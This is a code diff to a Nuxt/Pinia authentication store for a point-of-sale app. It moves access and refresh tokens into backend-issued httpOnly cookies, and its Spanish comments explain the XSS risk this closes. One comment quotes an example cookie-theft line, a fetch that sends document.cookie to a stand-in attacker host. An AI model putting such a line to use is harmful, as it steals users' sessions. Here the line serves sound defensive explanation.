@@ -3,59 +3,77 @@ import { ref, computed } from 'vue'
 import { useCookie, useNuxtApp } from '#app'
 import type { User, UserPermissions, ApiResponse, LoginData, MeData } from '~/types/auth'
 
+/**
+ * Marca LEGIBLE que indica "hay una sesión abierta". La emite el backend.
+ *
+ * No es una credencial: su valor es `1`. Existe sólo para que el middleware de
+ * rutas pueda decidir de forma SÍNCRONA si pinta la aplicación o manda al login.
+ * Sin ella habría que consultar `/auth/me` en cada navegación, y en un punto de
+ * venta eso es una ida y vuelta al servidor por cada clic del cajero.
+ */
+const MARCA_DE_SESION = 'session_active'
+
 export const useAuthStore = defineStore('auth', () => {
-  // === ESTADO (State) ===
+  // === ESTADO ===
   const user = ref<User | null>(null)
   const permissions = ref<UserPermissions>({} as UserPermissions)
-  
-  // Leemos cookies directamente (SSR Friendly)
-  const accessToken = useCookie<string | null>('access_token')
-  const refreshToken = useCookie<string | null>('refresh_token')
 
-  // === GETTERS (Computed) ===
-  const isAuthenticated = computed(() => !!accessToken.value)
+  // ─────────────────────────────────────────────────────────────────────
+  // AQUÍ YA NO HAY TOKENS.
+  //
+  // Hasta la Fase 4 este store guardaba `access_token` y `refresh_token` en
+  // cookies escritas desde JavaScript. Eso significa que cualquier XSS podía
+  // hacer `fetch('https://atacante/', { body: document.cookie })` y llevarse la
+  // sesión completa de un gerente: cobrar, anular ventas, ver el libro de
+  // controlados. El usuario legítimo no notaba nada.
+  //
+  // Ahora las emite el backend como `httpOnly`: el navegador las guarda y las
+  // adjunta él mismo, pero ningún script puede leerlas. El front sólo ve esta
+  // marca, que no concede acceso a nada.
+  // ─────────────────────────────────────────────────────────────────────
+  const sesionActiva = useCookie<string | null>(MARCA_DE_SESION)
+
+  // === GETTERS ===
+  const isAuthenticated = computed(() => !!sesionActiva.value)
   const can = computed(() => (permission: string) => !!permissions.value[permission])
   const isAdmin = computed(() => user.value?.role === 'ADMIN')
 
-  // === ACCIONES (Actions) ===
-  async function login(credentials: any) {
+  // === ACCIONES ===
+  async function login(credentials: { email: string; password: string; rememberMe?: boolean }) {
     const { $api } = useNuxtApp()
-    
-    // Llamamos al backend. A la interfaz ApiResponse<LoginData>
+
+    // La respuesta ya NO trae tokens: si los trajera, JavaScript podría leerlos
+    // del cuerpo y guardarlos donde un XSS los alcanzara, que es exactamente lo
+    // que las cookies httpOnly vienen a impedir. Llegan en cabeceras `Set-Cookie`
+    // que el navegador procesa sin que el código las vea.
     const res = await $api<ApiResponse<LoginData>>('/auth/login', {
       method: 'POST',
-      body: credentials
+      body: credentials,
     })
 
-    // Configuramos duración de cookies (Recordar sesión)
-    const maxAge = credentials.rememberMe ? 60 * 60 * 24 * 7 : 60 * 60 * 24 // 7 días o 1 dia
-    
-    const accCookie = useCookie('access_token', { maxAge, sameSite: 'lax' })
-    const refCookie = useCookie('refresh_token', { maxAge, sameSite: 'lax' })
-    
-    // Guardamos tokens
-    accCookie.value = res.data.accessToken
-    refCookie.value = res.data.refreshToken
+    // La marca la escribió el backend en la misma respuesta. Se refresca el ref
+    // para que `isAuthenticated` reaccione sin esperar a la siguiente
+    // navegación: el usuario pulsa "Entrar" y la interfaz cambia en el acto.
+    sesionActiva.value = '1'
 
-    // Actualizar el estado reactivo del store inmediatamente
-    accessToken.value = res.data.accessToken
-    refreshToken.value = res.data.refreshToken
-    
-    // Obtenemos el perfil completo (incluye permisos)
-    await fetchProfile(res.data.accessToken)
-    
+    user.value = res.data.user ?? null
+
+    // Perfil completo (incluye la matriz de permisos). Ya no hace falta pasarle
+    // ningún token: la cookie viaja sola.
+    await fetchProfile()
+
     return res
   }
 
-  async function fetchProfile(freshToken?: string) {
+  async function fetchProfile() {
     const { $api } = useNuxtApp()
     try {
-      const res = await $api<ApiResponse<MeData>>('/auth/me', {
-        headers: freshToken ? { Authorization: `Bearer ${freshToken}` } : undefined
-      })
+      const res = await $api<ApiResponse<MeData>>('/auth/me')
       user.value = res.data.user
       permissions.value = res.data.permissions
-    } catch (error) {
+    } catch {
+      // Un 401 aquí significa que ni el access ni el refresh sirven: el plugin
+      // ya intentó renovar antes de dejar caer el error.
       clearSession()
     }
   }
@@ -63,36 +81,43 @@ export const useAuthStore = defineStore('auth', () => {
   async function logout() {
     const { $api } = useNuxtApp()
     try {
-      if (refreshToken.value) {
-        await $api('/auth/logout', { 
-          method: 'POST', 
-          body: { refreshToken: refreshToken.value } 
-        })
-      }
+      // Sin cuerpo: el refresh token va en la cookie y el backend lo lee de ahí.
+      // Es él quien revoca la fila y borra las tres cookies.
+      await $api('/auth/logout', { method: 'POST', body: {} })
     } catch (error) {
+      // Aunque falle la revocación en el servidor, limpiamos en local: "cerrar
+      // sesión" no puede dejar al usuario dentro.
       console.error('Error al cerrar sesión', error)
     } finally {
       clearSession()
     }
   }
 
+  /**
+   * Limpia el estado local.
+   *
+   * Sólo puede borrar la MARCA: las cookies de sesión son httpOnly y JavaScript
+   * no las alcanza. Quien las borra de verdad es el backend, en `/auth/logout`.
+   * Si sólo se limpia aquí (por ejemplo tras un 401 irrecuperable), las cookies
+   * caducan solas y, mientras tanto, no conceden nada porque el token que
+   * contienen ya no es válido.
+   */
   function clearSession() {
     user.value = null
     permissions.value = {} as UserPermissions
-    useCookie('access_token').value = null
-    useCookie('refresh_token').value = null
+    sesionActiva.value = null
   }
 
   return {
     user,
     permissions,
-    accessToken,
+    sesionActiva,
     isAuthenticated,
     can,
     isAdmin,
     login,
     logout,
     fetchProfile,
-    clearSession
+    clearSession,
   }
 })
